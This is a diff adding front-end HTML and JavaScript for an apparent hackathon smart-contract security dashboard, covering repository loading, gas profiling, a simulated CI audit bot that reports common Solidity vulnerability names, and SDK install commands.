+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4 space-y-3">
+            <label class="block">
+              <span class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">GitHub Repository URL</span>
+              <div class="mt-1.5 flex gap-2">
+                <input id="repoUrl" value="https://github.com/vibeproof/defi-vault-foundry" spellcheck="false" class="flex-1 h-11 px-3 rounded-lg bg-ink-900 border border-zinc-800 font-mono text-[11.5px] text-zinc-200 focus:border-cyber/60 focus:outline-none" />
+                <button id="loadRepo" class="chip h-11 px-4 rounded-lg bg-cyber text-ink-900 text-xs font-extrabold hover:brightness-110 transition">Load Repo</button>
+              </div>
+            </label>
+            <div class="flex flex-wrap gap-2 font-mono text-[10.5px]">
+              <span class="text-zinc-600 self-center">Presets:</span>
+              <button class="repo-preset chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-zinc-300 hover:border-cyber/60" data-repo="https://github.com/vibeproof/defi-vault-foundry">defi-vault-foundry</button>
+              <button class="repo-preset chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-zinc-300 hover:border-cyber/60" data-repo="https://github.com/vibeproof/nft-minting-hardhat">nft-minting-hardhat</button>
+              <button class="repo-preset chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-zinc-300 hover:border-cyber/60" data-repo="https://github.com/vibeproof/cross-chain-bridge">cross-chain-bridge</button>
+            </div>
+            <div id="dropzone" class="dropzone rounded-xl border-2 border-dashed border-zinc-700 bg-ink-850 px-4 py-8 text-center transition-colors">
+              <p class="text-3xl">📦</p>
+              <p class="mt-2 text-[13px] font-semibold text-zinc-200">Drag & drop <span class="font-mono text-cyber">.sol</span> / .zip di sini</p>
+              <p class="mt-1 text-[11.5px] text-zinc-500">atau</p>
+              <label class="chip mt-3 h-10 px-4 inline-flex items-center rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors cursor-pointer">
+                Browse files
+                <input id="fileInput" type="file" accept=".sol,.zip,.json" multiple class="hidden" />
+              </label>
+              <p class="mt-3 font-mono text-[10px] text-zinc-600">File dibaca lokal di browser (FileReader) — tidak diunggah ke server.</p>
+            </div>
+          </div>
+
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="flex items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+              <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Project Tree</p>
+              <span id="treeMeta" class="chip h-5 px-2 inline-flex items-center rounded bg-ink-700 border border-zinc-800 font-mono text-[9.5px] text-zinc-400">0 files</span>
+              <span class="flex-1"></span>
+              <button id="scanAll" class="chip h-8 px-3 rounded-lg border border-safe/50 bg-safe/10 text-safe text-[11px] font-extrabold hover:bg-safe/20 transition-colors">Batch Audit</button>
+            </div>
+            <div id="fileTree" class="divide-y divide-zinc-800/70 max-h-[380px] overflow-y-auto scroll-thin"></div>
+            <div id="batchBar" class="hidden border-t border-zinc-800 bg-ink-850 px-4 py-3">
+              <div class="flex items-center gap-3 font-mono text-[11px] text-zinc-400"><span id="batchLabel">Scanning…</span><span class="flex-1"></span><span id="batchPct">0%</span></div>
+              <div class="mt-2 h-1.5 rounded-full bg-ink-600 overflow-hidden"><div id="batchFill" class="h-full w-0 bg-gradient-to-r from-cyber-600 to-safe transition-[width] duration-300"></div></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+              <h3 class="text-sm font-bold text-white">Contract Architecture & Dependency Graph</h3>
+              <span class="flex-1"></span>
+              <span class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-ink-700 border border-zinc-800 font-mono text-[10px] text-zinc-400">drag node untuk atur ulang</span>
+              <button id="graphReset" class="chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-300 hover:border-cyber/60 transition-colors">Reset layout</button>
+            </div>
+            <div class="relative bg-ink-900">
+              <div class="absolute inset-0 grid-lines opacity-50"></div>
+              <svg id="depGraph" viewBox="0 0 760 430" class="relative w-full h-auto"></svg>
+            </div>
+            <div id="nodeDetail" class="px-4 py-3 border-t border-zinc-800 bg-ink-850 font-mono text-[11px] text-zinc-500">Klik node untuk melihat detail kontrak, pewarisan, dan panggilan eksternal.</div>
+          </div>
+
+          <div class="grid sm:grid-cols-3 gap-4">
+            <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Portfolio Score</p><div class="mt-2 flex items-center gap-3"><div id="repoRing"></div><p class="font-mono text-[10.5px] text-zinc-500" id="repoRingLabel">belum di-scan</p></div></div>
+            <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">Total LOC</p><p class="mt-2 font-mono text-2xl font-extrabold text-white" id="repoLoc">0</p><p class="mt-1 font-mono text-[10px] text-zinc-500" id="repoFiles">0 .sol files</p></div>
+            <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4"><p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500">External Calls</p><p class="mt-2 font-mono text-2xl font-extrabold text-warn" id="repoCalls">0</p><p class="mt-1 font-mono text-[10px] text-zinc-500">trust boundary terdeteksi</p></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════ VIEW 6 · GAS PROFILER ═══════════ -->
+    <section id="view-gas" class="space-y-5 hidden">
+      <div class="relative overflow-hidden rounded-2xl border border-warn/25">
+        <div class="absolute inset-0 suite-bg opacity-20"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-warn/40 bg-warn/10 text-warn">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 4 14h6l-1 8 9-12h-6l1-8Z"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-warn">Priority #6 · Extra Polish</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">Gas Profiler & Opcode Optimization Hub</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Temukan pemborosan gas level opcode, lalu hitung penghematan BOT token per 1.000 transaksi.</p>
+          </div>
+          <div class="flex flex-wrap gap-2">
+            <span class="chip h-9 px-3 inline-flex items-center rounded-lg border border-zinc-700 bg-ink-800/80 font-mono text-[11px] text-zinc-400">target: EtherVault.sol</span>
+            <span class="chip h-9 px-3 inline-flex items-center rounded-lg border border-safe/40 bg-safe/10 font-mono text-[11px] text-safe">−<b id="hdrGasSaved">18,420</b> gas/tx</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid xl:grid-cols-[minmax(0,1.3fr)_minmax(0,1fr)] gap-5 items-start">
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="px-4 py-3 border-b border-zinc-800 bg-ink-850 flex items-center gap-2">
+              <h3 class="text-sm font-bold text-white">Function-Level Gas Bottlenecks</h3>
+              <span class="flex-1"></span>
+              <span class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-ink-700 border border-zinc-800 font-mono text-[10px] text-zinc-400">forge snapshot</span>
+            </div>
+            <div class="overflow-x-auto scroll-thin">
+              <table class="tbl w-full text-left font-mono text-[11.5px]">
+                <thead><tr class="bg-ink-850"><th class="px-4 py-2.5">Function</th><th class="px-3 py-2.5">Before</th><th class="px-3 py-2.5">After</th><th class="px-3 py-2.5">Saved</th><th class="px-4 py-2.5 w-[26%]">Impact</th></tr></thead>
+                <tbody id="gasBody"></tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-5">
+            <h3 class="text-sm font-bold text-white mb-4">Opcode Distribution</h3>
+            <div id="opcodeBars" class="space-y-3"></div>
+            <div class="mt-4 flex h-3 rounded-full overflow-hidden border border-zinc-800" id="opcodeStack"></div>
+            <p class="mt-2 font-mono text-[10px] text-zinc-600">SSTORE mendominasi biaya — target utama optimisasi storage packing & write-once pattern.</p>
+          </div>
+        </div>
+
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <p class="px-4 py-3 border-b border-zinc-800 bg-ink-850 text-[10px] font-bold uppercase tracking-widest text-zinc-500">Optimization Findings</p>
+            <div id="gasFindings" class="divide-y divide-zinc-800/80 max-h-[420px] overflow-y-auto scroll-thin"></div>
+          </div>
+
+          <div class="rounded-2xl border border-cyber/25 bg-ink-800 p-5">
+            <div class="flex items-center gap-2 mb-4">
+              <h3 class="text-sm font-bold text-white">BOT Token Savings Calculator</h3>
+              <span class="chip h-5 px-2 inline-flex items-center rounded bg-cyber/10 border border-cyber/40 text-cyber text-[9px] font-extrabold tracking-widest uppercase">live</span>
+            </div>
+            <div class="space-y-4">
+              <label class="block"><span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>Gas saved per tx</span><span id="g1v" class="text-cyber">18,420</span></span><input id="g1" type="range" min="1000" max="80000" step="100" value="18420" class="w-full mt-2" /></label>
+              <label class="block"><span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>Transactions / day</span><span id="g2v" class="text-cyber">5,000</span></span><input id="g2" type="range" min="100" max="200000" step="100" value="5000" class="w-full mt-2" /></label>
+              <label class="block"><span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>Gas price (gwei)</span><span id="g3v" class="text-cyber">1.2</span></span><input id="g3" type="range" min="0.1" max="50" step="0.1" value="1.2" class="w-full mt-2" /></label>
+              <label class="block"><span class="flex justify-between font-mono text-[11px] text-zinc-400"><span>BOT price (USD)</span><span id="g4v" class="text-cyber">$12.04</span></span><input id="g4" type="range" min="1" max="60" step="0.01" value="12.04" class="w-full mt-2" /></label>
+            </div>
+            <div class="mt-5 grid grid-cols-2 gap-px bg-zinc-800 rounded-xl overflow-hidden font-mono text-[11px]">
+              <div class="bg-ink-850 px-3 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Per 1,000 tx</p><p id="s1k" class="mt-1 text-base font-extrabold text-safe">—</p><p id="s1ku" class="text-[10px] text-zinc-500">—</p></div>
+              <div class="bg-ink-850 px-3 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Per day</p><p id="sday" class="mt-1 text-base font-extrabold text-safe">—</p><p id="sdayu" class="text-[10px] text-zinc-500">—</p></div>
+              <div class="bg-ink-850 px-3 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Per month</p><p id="smon" class="mt-1 text-base font-extrabold text-cyber">—</p><p id="smonu" class="text-[10px] text-zinc-500">—</p></div>
+              <div class="bg-ink-850 px-3 py-3"><p class="text-[9px] uppercase tracking-widest text-zinc-600">Per year</p><p id="syear" class="mt-1 text-base font-extrabold text-cyber">—</p><p id="syearu" class="text-[10px] text-zinc-500">—</p></div>
+            </div>
+            <p class="mt-3 font-mono text-[10px] text-zinc-600 leading-relaxed">Formula: <span class="text-zinc-400">gasSaved × txCount × gasPrice(gwei) × 1e9 wei ÷ 1e18 = BOT</span> · USD = BOT × price</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════ VIEW 7 · DEVELOPER PORTAL ═══════════ -->
+    <section id="view-devportal" class="space-y-5 hidden">
+      <div class="relative overflow-hidden rounded-2xl border border-zinc-800">
+        <div class="absolute inset-0 suite-bg opacity-20"></div>
+        <div class="absolute inset-0 bg-gradient-to-r from-ink-900 via-ink-900/85 to-ink-900/40"></div>
+        <div class="relative p-6 flex flex-wrap items-center gap-4">
+          <span class="grid place-items-center w-12 h-12 rounded-xl border border-zinc-700 bg-ink-800 text-cyber">
+            <svg viewBox="0 0 24 24" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m9 8-5 4 5 4M15 8l5 4-5 4"/></svg>
+          </span>
+          <div class="flex-1 min-w-[240px]">
+            <p class="chip text-[10px] font-extrabold tracking-[0.25em] uppercase text-zinc-400">Priority #7 · Developer Tooling</p>
+            <h1 class="mt-1 text-xl sm:text-2xl font-extrabold text-white tracking-tight">Developer Portal, CI/CD Action & On-Chain Firewall SDK</h1>
+            <p class="mt-1 text-[13px] text-zinc-400">Visi integrasi: GitHub Actions security gate, SDK <span class="font-mono text-cyber">IVibeProofGuard</span> agar dApp lain menolak kontrak yang belum teraudit.</p>
+          </div>
+          <a href="https://github.com/" target="_blank" rel="noopener" class="chip h-10 px-4 inline-flex items-center rounded-lg border border-zinc-700 bg-ink-800/80 text-xs font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">GitHub Repo ↗</a>
+        </div>
+      </div>
+
+      <div class="grid xl:grid-cols-2 gap-5 items-start">
+        <!-- GitHub Actions simulator -->
+        <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+          <div class="flex flex-wrap items-center gap-2 px-4 py-3 border-b border-zinc-800 bg-ink-850">
+            <h3 class="text-sm font-bold text-white">GitHub Actions Bot Simulator</h3>
+            <span class="chip h-6 px-2.5 inline-flex items-center rounded-full bg-ink-700 border border-zinc-800 font-mono text-[10px] text-zinc-400">vibeproof-audit.yml</span>
+            <span class="flex-1"></span>
+            <button id="prSimulate" class="chip h-9 px-3.5 rounded-lg bg-cyber text-ink-900 text-[11px] font-extrabold hover:brightness-110 transition">Simulate PR Opened</button>
+            <button id="copyWorkflow" class="chip h-9 px-3.5 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy YAML</button>
+          </div>
+
+          <div class="p-4 space-y-4 bg-ink-900">
+            <div class="rounded-xl border border-zinc-800 bg-ink-850 p-4">
+              <div class="flex items-start gap-3">
+                <span class="grid place-items-center w-9 h-9 rounded-lg bg-safe/15 border border-safe/40 text-safe font-extrabold text-sm">PR</span>
+                <div class="min-w-0 flex-1">
+                  <p class="text-[13px] font-bold text-white">#142 — feat(vault): add withdraw() with native transfer</p>
+                  <p class="mt-0.5 font-mono text-[10.5px] text-zinc-500">vibeproof/defi-vault-foundry · opened by @vibecoder · 3 files changed <span class="text-safe">+42</span> <span class="text-crit">−7</span></p>
+                </div>
+                <span id="prCheck" class="chip h-7 px-3 inline-flex items-center gap-1.5 rounded-full border border-zinc-700 bg-ink-700 font-mono text-[10px] text-zinc-400">queued</span>
+              </div>
+            </div>
+
+            <div id="botComment" class="hidden rounded-xl border border-zinc-800 bg-ink-850 overflow-hidden">
+              <div class="flex items-center gap-2.5 px-4 py-3 border-b border-zinc-800">
+                <span class="grid place-items-center w-8 h-8 rounded-lg border border-cyber/40 bg-cyber/10">
+                  <svg viewBox="0 0 24 24" class="w-4.5 h-4.5 w-5 h-5 text-cyber" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2.5 4.5 5.6v5.2c0 4.7 3.2 8.6 7.5 10.7 4.3-2.1 7.5-6 7.5-10.7V5.6L12 2.5Z"/><path d="m9 11.8 2.2 2.2L15.4 9.6"/></svg>
+                </span>
+                <p class="font-mono text-[11.5px] text-zinc-300"><b class="text-white">vibeproof-bot</b> <span class="text-zinc-500">commented just now</span></p>
+                <span class="flex-1"></span>
+                <span class="chip h-6 px-2 inline-flex items-center rounded bg-cyber/10 border border-cyber/40 text-cyber text-[9px] font-extrabold tracking-widest uppercase">CI</span>
+              </div>
+              <div class="p-4 space-y-3">
+                <div class="flex flex-wrap items-center gap-3">
+                  <span id="botVerdict" class="chip h-8 px-3.5 inline-flex items-center rounded-full border text-[10.5px] font-extrabold tracking-widest uppercase border-crit/50 bg-crit/10 text-crit">CRITICAL RISK</span>
+                  <span class="font-mono text-[11.5px] text-zinc-400">Security Score <b id="botScore" class="text-white text-base">28</b>/100</span>
+                  <span class="font-mono text-[11px] text-zinc-500">· 2 critical · 2 high · scan 3.8s</span>
+                </div>
+                <div class="rounded-lg border border-crit/30 bg-crit/[0.07] px-3.5 py-3">
+                  <p class="text-[12px] font-bold text-crit">🚨 Merge diblokir — security gate gagal</p>
+                  <ul class="mt-2 space-y-1.5 font-mono text-[11px] text-zinc-300">
+                    <li><span class="text-crit">✗</span> L21 · Reentrancy — external call sebelum state update <span class="text-zinc-600">(SWC-107)</span></li>
+                    <li><span class="text-crit">✗</span> L28 · tx.origin authentication <span class="text-zinc-600">(SWC-115)</span></li>
+                    <li><span class="text-warn">!</span> L32 · setOwner() tanpa access control <span class="text-zinc-600">(SWC-105)</span></li>
+                    <li><span class="text-cyber">⚡</span> 3 gas tips · estimasi hemat 18,420 gas/tx</li>
+                  </ul>
+                </div>
+                <div class="flex flex-wrap gap-2">
+                  <button data-goto="patch" class="goto-btn chip h-9 px-3.5 rounded-lg border border-safe/50 bg-safe/10 text-safe text-[11px] font-bold hover:bg-safe/20 transition-colors">Auto-patch dengan AI →</button>
+                  <button data-goto="exploit" class="goto-btn chip h-9 px-3.5 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-crit/60 hover:text-crit transition-colors">Lihat Exploit PoC</button>
+                  <span class="chip h-9 px-3.5 inline-flex items-center rounded-lg border border-zinc-800 bg-ink-900 font-mono text-[10.5px] text-zinc-500">code hash 0x8f3a…e8f1</span>
+                </div>
+              </div>
+            </div>
+
+            <div id="prLog" class="rounded-xl border border-zinc-800 bg-ink-950 px-4 py-3 font-mono text-[11px] leading-6 text-zinc-500 min-h-[120px]"></div>
+          </div>
+
+          <div class="border-t border-zinc-800">
+            <div class="flex items-center gap-2 px-4 py-2.5 bg-ink-850">
+              <span class="font-mono text-[11px] text-zinc-400">.github/workflows/vibeproof-audit.yml</span>
+              <span class="flex-1"></span>
+              <button data-copy="workflowYaml" class="copy-code chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy</button>
+            </div>
+            <pre id="workflowYaml" class="code scroll-thin max-h-[320px] overflow-auto px-4 py-3 bg-ink-900 text-zinc-300"></pre>
+          </div>
+        </div>
+
+        <!-- Firewall SDK -->
+        <div class="space-y-4">
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 overflow-hidden">
+            <div class="flex flex-wrap border-b border-zinc-800 bg-ink-850">
+              <button data-stab="sol" class="stab chip h-11 px-4 text-xs font-bold text-cyber border-b-2 border-cyber -mb-px">IVibeProofGuard.sol</button>
+              <button data-stab="dapp" class="stab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">dApp Integration</button>
+              <button data-stab="js" class="stab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">JS SDK</button>
+              <button data-stab="api" class="stab chip h-11 px-4 text-xs font-bold text-zinc-500 border-b-2 border-transparent -mb-px hover:text-zinc-300">REST API</button>
+            </div>
+            <div class="flex items-center gap-2 px-4 py-2.5 border-b border-zinc-800 bg-ink-850">
+              <span id="sdkFileName" class="font-mono text-[11px] text-zinc-400">contracts/interfaces/IVibeProofGuard.sol</span>
+              <span class="flex-1"></span>
+              <button data-copy="sdkCode" class="copy-code chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 text-[11px] font-bold text-zinc-200 hover:border-cyber/60 hover:text-cyber transition-colors">Copy</button>
+            </div>
+            <pre id="sdkCode" class="code scroll-thin max-h-[430px] overflow-auto px-4 py-3 bg-ink-900 text-zinc-300"></pre>
+          </div>
+
+          <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+            <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-3">On-Chain Firewall — Live Guard Check</p>
+            <div class="flex flex-wrap gap-2">
+              <input id="guardTarget" value="0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578" spellcheck="false" class="flex-1 min-w-[220px] h-11 px-3 rounded-lg bg-ink-900 border border-zinc-800 font-mono text-[11px] text-zinc-200 focus:border-cyber/60 focus:outline-none" />
+              <button id="guardRun" class="chip h-11 px-4 rounded-lg bg-cyber text-ink-900 text-xs font-extrabold hover:brightness-110 transition">require(isAudited)</button>
+            </div>
+            <div class="mt-3 flex flex-wrap gap-2">
+              <button class="guard-sample chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 font-mono text-[10.5px] text-zinc-300 hover:border-safe/60" data-addr="0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578">certified (96)</button>
+              <button class="guard-sample chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 font-mono text-[10.5px] text-zinc-300 hover:border-warn/60" data-addr="0x52Ffb319cD20a4E87710c9d5Aa33e1De9c11b4A7">warning (58)</button>
+              <button class="guard-sample chip h-8 px-3 rounded-lg border border-zinc-700 bg-ink-700 font-mono text-[10.5px] text-zinc-300 hover:border-crit/60" data-addr="0xDeAdC0de0000000000000000000000000000bEEf">unaudited</button>
+            </div>
+            <pre id="guardConsole" class="code scroll-thin mt-3 max-h-[180px] overflow-auto rounded-lg border border-zinc-800 bg-ink-950 px-3 py-2.5 text-[11px] leading-6 text-zinc-500"></pre>
+          </div>
+
+          <div class="grid sm:grid-cols-2 gap-4">
+            <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+              <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-2">Install SDK</p>
+              <div class="space-y-2">
+                <div class="flex items-center gap-2 rounded-lg border border-zinc-800 bg-ink-900 px-3 py-2 font-mono text-[11px] text-zinc-300"><span class="text-cyber">$</span><span class="flex-1 truncate">npm i @vibeproof/sdk</span><button class="copy-cmd text-zinc-600 hover:text-cyber" data-cmd="npm i @vibeproof/sdk">⧉</button></div>
+                <div class="flex items-center gap-2 rounded-lg border border-zinc-800 bg-ink-900 px-3 py-2 font-mono text-[11px] text-zinc-300"><span class="text-cyber">$</span><span class="flex-1 truncate">vibeproof audit ./src --chain 968</span><button class="copy-cmd text-zinc-600 hover:text-cyber" data-cmd="vibeproof audit ./src --chain 968">⧉</button></div>
+                <div class="flex items-center gap-2 rounded-lg border border-zinc-800 bg-ink-900 px-3 py-2 font-mono text-[11px] text-zinc-300"><span class="text-cyber">$</span><span class="flex-1 truncate">vibeproof certify --network bot-mainnet</span><button class="copy-cmd text-zinc-600 hover:text-cyber" data-cmd="vibeproof certify --network bot-mainnet">⧉</button></div>
+              </div>
+            </div>
+            <div class="rounded-2xl border border-zinc-800 bg-ink-800 p-4">
+              <p class="text-[10px] font-bold uppercase tracking-widest text-zinc-500 mb-2">Roadmap Integrasi</p>
+              <ul class="space-y-2 text-[12px] text-zinc-400">
+                <li class="flex gap-2"><span class="text-safe">✓</span> GitHub Actions security gate (beta)</li>
+                <li class="flex gap-2"><span class="text-safe">✓</span> IVibeProofGuard on-chain firewall</li>
+                <li class="flex gap-2"><span class="text-cyber">◎</span> Telegram/Discord audit bot</li>
+                <li class="flex gap-2"><span class="text-zinc-600">○</span> IDE plugin (VS Code / Cursor)</li>
+                <li class="flex gap-2"><span class="text-zinc-600">○</span> Insurance underwriting API</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer class="border-t border-zinc-800 bg-ink-850 mt-8">
+  <div class="max-w-[1680px] mx-auto px-4 sm:px-6 h-16 flex flex-wrap items-center gap-3 font-mono text-[11px] text-zinc-600">
+    <span>© 2025 VibeProof · Built for Girl Meets Tech × On Chain Consultancy — Build Week Hackathon Vol.2</span>
+    <span class="flex-1"></span>
+    <span class="chip hidden sm:inline">VibeProof.sol @ BOT Chain 968 / 677 · gas: BOT</span>
+  </div>
+</footer>
+
+<div id="toasts" class="fixed bottom-5 right-5 z-[80] space-y-2 w-[calc(100vw-2.5rem)] max-w-sm"></div>
+<div id="printArea"></div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════
+   VibeProof Security Suite — SPA (7 modul lanjutan)
+   ═══════════════════════════════════════════════════════════ */
+const $  = (s, r=document) => r.querySelector(s);
+const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
+
+const NETWORKS = {
+  testnet:{key:'testnet',name:'BOT Chain Testnet',id:968,hex:'0x3C8',rpc:'https://rpc.bohr.life',explorer:'https://scan.bohr.life',faucet:'https://faucet.botchain.ai/basic',baseBlock:3412880},
+  mainnet:{key:'mainnet',name:'BOT Chain Mainnet',id:677,hex:'0x2A5',rpc:'https://rpc.botchain.ai',explorer:'https://scan.botchain.ai',faucet:'Alokasi organizer via Telegram',baseBlock:22859700}
+};
+const VIBEPROOF_ADDR='0x97E0C6A5A352aF3e35A221d6d13d7890a8a6F578';
+const state={network:'testnet',wallet:null,view:'exploit'};
+
+/* ---------- utils ---------- */
+function fnv1a(str,seed){let h=0x811c9dc5^seed;for(let i=0;i<str.length;i++){h^=str.charCodeAt(i);h=Math.imul(h,0x01000193)>>>0;}return h>>>0;}
+function keccakMock(str){let o='';for(let i=0;i<8;i++)o+=fnv1a(str+'::'+i,0x9e3779b9+i*2654435761).toString(16).padStart(8,'0');return '0x'+o;}
+function shortHash(h,a=6,b=4){return h.slice(0,a+2)+'…'+h.slice(-b);}
+function randHex(n){let s='';const c='0123456789abcdef';for(let i=0;i<n;i++)s+=c[Math.floor(Math.random()*16)];return s;}
+function gradeOf(s){
+  if(s>=80)return{key:'safe',color:'#10b981',verdict:'PASSED — SAFE',chip:'border-safe/50 bg-safe/10 text-safe'};
+  if(s>=50)return{key:'warn',color:'#f59e0b',verdict:'WARNINGS DETECTED',chip:'border-warn/50 bg-warn/10 text-warn'};
+  return{key:'crit',color:'#f43f5e',verdict:'CRITICAL RISK',chip:'border-crit/50 bg-crit/10 text-crit'};
+}
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+const KW_SOL='pragma|solidity|contract|interface|library|abstract|function|external|internal|public|private|view|pure|payable|returns|return|require|revert|emit|event|mapping|address|uint256|uint128|uint64|uint8|int256|bytes32|bytes|bool|string|memory|calldata|storage|is|new|import|from|modifier|constructor|unchecked|struct|enum|constant|immutable|indexed|override|virtual|if|else|for|while|assert|true|false|error|using';
+const KW_TS='import|from|export|const|let|var|async|await|function|return|if|else|for|while|new|class|interface|type|describe|it|expect|await|ethers|hardhat|try|catch';
+const KW_YML='name|on|jobs|runs-on|steps|uses|with|run|env|if|needs|id|shell';
+function hl(code,lang='sol'){
+  const kw = lang==='sol'?KW_SOL : lang==='ts'?KW_TS : lang==='yml'?KW_YML : 'git|npm|npx|forge|cast|anvil|cd|install|run|test|export';
+  const re = new RegExp('(#\\![^\\n]*|\\/\\/[^\\n]*|#[^\\n]*)|("(?:[^"\\\\]|\\\\.)*")|(\\b(?:'+kw+')\\b)|(0x[0-9a-fA-F]{6,})|(\\b\\d[\\d_.,]*\\b)','g');
+  return esc(code).replace(re,(m,com,str,k,addr,num)=>{
+    if(com) return '<span class="text-zinc-600 italic">'+com+'</span>';
+    if(str) return '<span class="text-safe">'+str+'</span>';
+    if(k)   return '<span class="text-cyber">'+k+'</span>';
+    if(addr)return '<span class="text-warn">'+addr+'</span>';
+    if(num) return '<span class="text-warn/90">'+num+'</span>';
+    return m;
+  });
+}
+function toast(msg,type='info'){
+  const c={info:'border-cyber/50 text-cyber',ok:'border-safe/50 text-safe',warn:'border-warn/50 text-warn',err:'border-crit/50 text-crit'};
+  const el=document.createElement('div');
+  el.className='rise-in flex items-start gap-2.5 rounded-xl border '+c[type]+' bg-ink-800/95 backdrop-blur px-4 py-3 text-[12.5px] font-medium shadow-lg';
+  el.innerHTML='<span class="mt-0.5 w-1.5 h-1.5 rounded-full bg-current shrink-0"></span><span class="text-zinc-200">'+msg+'</span>';
+  $('#toasts').appendChild(el);
+  setTimeout(()=>{el.style.transition='opacity .4s';el.style.opacity='0';setTimeout(()=>el.remove(),420);},3400);
+}
+async function copyText(t,l='Tersalin ke clipboard'){
+  try{await navigator.clipboard.writeText(t);toast(l,'ok');}
+  catch(e){const ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();document.execCommand('copy');ta.remove();toast(l,'ok');}
+}
+function download(name,content){
+  const b=new Blob([content],{type:'text/plain;charset=utf-8'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download=name;a.click();
+  setTimeout(()=>URL.revokeObjectURL(a.href),1500);
+}
+function ringSVG(score,size,stroke){
+  const g=gradeOf(score),sw=stroke||3.5,C=2*Math.PI*14;
+  return '<span class="relative inline-grid place-items-center shrink-0" style="width:'+size+'px;height:'+size+'px">'+
+    '<svg viewBox="0 0 36 36" class="w-full h-full -rotate-90"><circle cx="18" cy="18" r="14" stroke="#1f232e" stroke-width="'+sw+'" fill="none"/>'+
+    '<circle cx="18" cy="18" r="14" stroke="'+g.color+'" stroke-width="'+sw+'" fill="none" stroke-linecap="round" stroke-dasharray="'+C+'" stroke-dashoffset="'+(C*(1-score/100))+'"/></svg>'+
+    '<span class="absolute font-mono font-extrabold text-white" style="font-size:'+Math.round(size*.32)+'px">'+score+'</span></span>';
+}
+function typeLines(box,lines,delay,done){
+  box.innerHTML='';let i=0;
+  const t=setInterval(()=>{
+    if(i>=lines.length){clearInterval(t);if(done)done();return;}
+    box.insertAdjacentHTML('beforeend','<div class="rise-in">'+lines[i]+'</div>');
